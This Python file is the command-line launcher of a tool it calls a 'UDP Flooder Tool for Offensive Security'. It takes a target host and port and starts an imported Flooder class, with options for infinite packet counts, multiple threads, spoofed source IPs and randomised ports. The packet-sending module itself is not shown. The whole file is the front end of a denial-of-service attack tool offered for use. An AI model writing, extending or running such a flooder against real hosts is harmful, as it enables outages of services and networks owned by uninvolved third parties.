import argparse, sys
from flooder import Flooder

def main():
    """
    Main entry point for the UDP Flooder application.
    Handles command-line arguments and initiates the flooding process.
    """
    parser = argparse.ArgumentParser(
        description="UDP Flooder Tool for Offensive Security.",
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument("-th", "--target-host", type=str, required=True, help="The target IP address or hostname to flood (e.g., 127.0.0.1 or example.com)")
    parser.add_argument("-tp", "--target-port", type=int, required=True, help="The target port number to flood (e.g., 80 or 53)")
    parser.add_argument("-m", "--message", type=str, default="ATTACK!", help="The message payload to send in each UDP packet.\nDefault: 'ATTACK!'")
    parser.add_argument("-c", "--count", type=int, default=-1, help="Number of packets to send. Use -1 for infinite (default).")
    parser.add_argument("-t", "--threaded", action="store_true", help="Enable multi-threading for the flood.")
    parser.add_argument("-tc", "--thread-count", type=int, default=10, help="Number of threads to use for multi-threading. Default: 10")

    parser.add_argument("-s", "--spoof", action="store_true", help="Enable IP spoofing for the flood.")
    parser.add_argument("-r", "--randomize-ports", action="store_true", help="When combined with --spoof, randomizes the destination port for each packet.")
    
    args = parser.parse_args()

    try:
        flooder = Flooder(
            target_host=args.target_host,
            target_port=args.target_port,
            message=args.message,
            thread_count=args.thread_count
        )
        
        # Determine the flood type based on command-line arguments
        if args.threaded:
            if args.spoof:
                flooder.start_threaded(flood_type="spoofed", packet_count=args.count, randomize_ports=args.randomize_ports)
            else:
                flooder.start_threaded(flood_type="default", packet_count=args.count)
        else: # Single-threaded
            if args.spoof:
                flooder.start_spoofed(packet_count=args.count, randomize_ports=args.randomize_ports)
            else:
                flooder.start(packet_count=args.count)

    except ValueError as ve:
        print(f"[!] Configuration Error: {ve}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] An unexpected error occurred: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
